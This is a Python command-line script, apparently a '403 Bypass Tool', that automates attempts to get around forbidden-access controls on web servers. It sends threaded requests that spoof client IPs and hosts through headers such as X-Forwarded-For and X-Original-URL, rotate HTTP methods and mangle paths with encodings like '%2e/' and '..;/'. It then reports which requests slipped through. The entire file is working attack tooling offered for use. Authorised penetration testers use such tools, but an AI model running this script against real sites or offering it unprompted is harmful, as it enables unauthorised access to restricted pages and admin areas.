#!/usr/bin/env python3
import requests
import sys
import argparse
import random
import string
from concurrent.futures import ThreadPoolExecutor

class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'
    BOLD = '\033[1m'

def random_user_agent():
    return ''.join(random.choices(string.ascii_uppercase, k=7))

BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Original-URL": ""},
    {"X-Rewrite-URL": ""},
    {"Client-IP": "127.0.0.1"},
    {"Host": "localhost"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"X-rewrite-url": "admin/login"}
]

HTTP_METHODS = ["GET", "POST", "PUT", "HEAD", "PATCH", "TRACE"]

PATH_TECHNIQUES = [
    "{}", "%2e/{}", "%2f{}/", "%2f{}%2f", "./{}/","{}/.", "/{}/./","/{}//", "./{}/./",
    "{}?", "{}.html", "{}.php", "{}#", "{}..;/", "{};/",
    "//{}///", "{}/ ".upper(), "*{}/", "/{}", "/{}//", "{}../", "{}/*", ";/{}/", "/;//{}/"
]

def load_wordlist(wordlist_file):
    try:
        with open(wordlist_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{colors.RED}[!] Wordlist file not found: {wordlist_file}{colors.END}")
        sys.exit(1)

def test_bypass(url, path, headers=None, method="GET", verbose=False):
    try:
        effective_path = f"/{path}" if path else "/"
        full_url = url + effective_path
        
        final_headers = headers.copy() if headers else {}
        final_headers["User-Agent"] = random_user_agent()
        
        if "X-Original-URL" in final_headers:
            final_headers["X-Original-URL"] = effective_path.lstrip('/')
        if "X-Rewrite-URL" in final_headers:
            final_headers["X-Rewrite-URL"] = effective_path.lstrip('/')
        
        if verbose:
            print(f"{colors.BLUE}[*] Testing: {method} {full_url}", end='')
            if headers:
                print(f" with headers: {headers}", end='')
            print(colors.END)
        
        response = requests.request(
            method, 
            full_url, 
            headers=final_headers, 
            timeout=5,
            allow_redirects=True
        )
        
        if verbose:
            print(f"{colors.YELLOW}    Response: {response.status_code}{colors.END}")
        
        if response.status_code in [200, 301, 302, 303, 307, 308]:
            return True, response.status_code, method, final_headers, effective_path
    except Exception as e:
        if verbose:
            print(f"{colors.RED}    Error: {e}{colors.END}")
    return False, 0, None, None, None

def print_success(url, status_code, method, headers, path):
    print(f"\n{colors.GREEN}[+] Bypass found!{colors.END}")
    print(f"URL: {url}{path}")
    print(f"Method: {colors.BOLD}{method}{colors.END}")
    print(f"Status: {colors.BOLD}{status_code}{colors.END}")
    if headers:
        print("Headers:")
        for k, v in headers.items():
            if v:  
                print(f"  {k}: {v}")
    print("-" * 50)

def run_tests(target_url, path, threads=20, verbose=False):
    effective_path = path if path is not None else ""
    
    if verbose:
        print(f"\n{colors.BOLD}[*] Testing HTTP Methods on /{effective_path}{colors.END}")
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for method in HTTP_METHODS:
            futures.append(executor.submit(test_bypass, target_url, effective_path, None, method, verbose))
        
        for future in futures:
            success, code, method, headers, path = future.result()
            if success:
                print_success(target_url, code, method, headers, path)

    if verbose:
        print(f"\n{colors.BOLD}[*] Testing Headers on /{effective_path}{colors.END}")
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for header in BYPASS_HEADERS:
            h = header.copy()
            futures.append(executor.submit(test_bypass, target_url, effective_path, h, "GET", verbose))
        
        for future in futures:
            success, code, _, headers, path = future.result()
            if success:
                print_success(target_url, code, "GET", headers, path)

    if effective_path:
        if verbose:
            print(f"\n{colors.BOLD}[*] Testing Path Fuzzing{colors.END}")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for technique in PATH_TECHNIQUES:
                if technique == "{}/ ".upper():
                    modified_path = technique.format(effective_path.upper())
                else:
                    modified_path = technique.format(effective_path)
                futures.append(executor.submit(test_bypass, target_url, modified_path, None, "GET", verbose))
            
            for future in futures:
                success, code, _, _, path = future.result()
                if success:
                    print_success(target_url, code, "GET", None, path)

def main():
    parser = argparse.ArgumentParser(description='403 Bypass Tool')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('paths', nargs='?', default=None, help='Paths to test (comma-separated, default: root path)')
    parser.add_argument('-w', '--wordlist', help='Wordlist file containing paths to test')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of threads')
    
    args = parser.parse_args()
    
    if not args.url.startswith(('http://', 'https://')):
        args.url = f'https://{args.url}'
    
    target_url = args.url.rstrip('/')
    
    if args.wordlist:
        paths = load_wordlist(args.wordlist)
        if args.verbose:
            print(f"{colors.BLUE}[*] Testing {len(paths)} paths from wordlist{colors.END}")
        
        for path in paths:
            if args.verbose:
                print(f"\n{colors.BOLD}[*] Testing path: {path}{colors.END}")
            run_tests(target_url, path, args.threads, args.verbose)
    else:
        if args.paths:
            # Split paths by comma and strip whitespace
            paths = [p.strip() for p in args.paths.split(',')]
            for path in paths:
                if args.verbose:
                    print(f"\n{colors.BOLD}[*] Testing path: {path}{colors.END}")
                run_tests(target_url, path, args.threads, args.verbose)
        else:
            run_tests(target_url, None, args.threads, args.verbose)

if __name__ == "__main__":
    main()
